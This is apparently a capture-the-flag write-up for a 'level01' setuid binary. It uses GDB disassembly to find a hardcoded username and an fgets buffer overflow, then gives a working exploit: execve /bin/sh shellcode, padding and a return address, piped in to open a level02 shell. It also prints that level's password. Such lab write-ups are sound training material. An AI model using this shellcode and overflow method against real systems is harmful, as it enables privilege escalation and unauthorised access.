```shell
$> ls -la
[...]
-rwsr-s---+ 1 level02 users   7360 Sep 10  2016 level01
[...]

$> ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: admin
verifying username....

nope, incorrect username...
```

Analyze with ghidra and disassembler the code in GDB

```c
// check source.c file
// we don't have a system call to execute /bin/sh in the binary
```

```shell
$> gdb -q level01
(gdb) set disassembly-flavor intel
(gdb) disas verify_user_pass
    [...]
    0x080484ad <+10>:    mov    eax,0x80486b0
    [...]

# it calls strncmp to compare the param with the "admin" (0x80486b0)

(gdb) disas 
    [...]
    0x0804847d <+25>:    mov    eax,0x80486a8
    [...]

# it calls strncmp to compare the variable a_user_name with the "dat_will" (0x80486a8)

(gdb) disas main
    [...]
    # not interesting content ...
    [...]
    0x08048561 <+145>:   mov    DWORD PTR [esp+0x8],eax
    0x08048565 <+149>:   mov    DWORD PTR [esp+0x4],0x64
    0x0804856d <+157>:   lea    eax,[esp+0x1c]
    0x08048571 <+161>:   mov    DWORD PTR [esp],eax
    0x08048574 <+164>:   call   0x8048370 <fgets@plt>
    [...]

# fgets calls here, can stock 100 bytes in the buffer, but ur buffer is too small (64 bytes)
# so we can overflow it and insert a shellcode.

(gdb) r
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....


Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()

# offset is 80
```

```shell
$> ltrace ./level01
[...]
[...] = 0xffffd68c
[...]

# we need know the address where the password is stocked
# in linux (42): 0xffffd6dc

$> python -c "print 'dat_wil'" > /tmp/p1

# dat_wil for the first input, to pass next step

$> python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\x90' * 59 + '\x8c\xd6\xff\xff'" > /tmp/p2

# shellcode (21 bytes) + padding (59 bytes becaise 21 + 59 = 80) + address of the password buffer

# if use linux (42)
# $> python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\x90' * 59 + '\xdc\xd6\xff\xff'" > /tmp/p2

$> (cat /tmp/p1; cat /tmp/p2; cat) | ./level01
[...]
whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```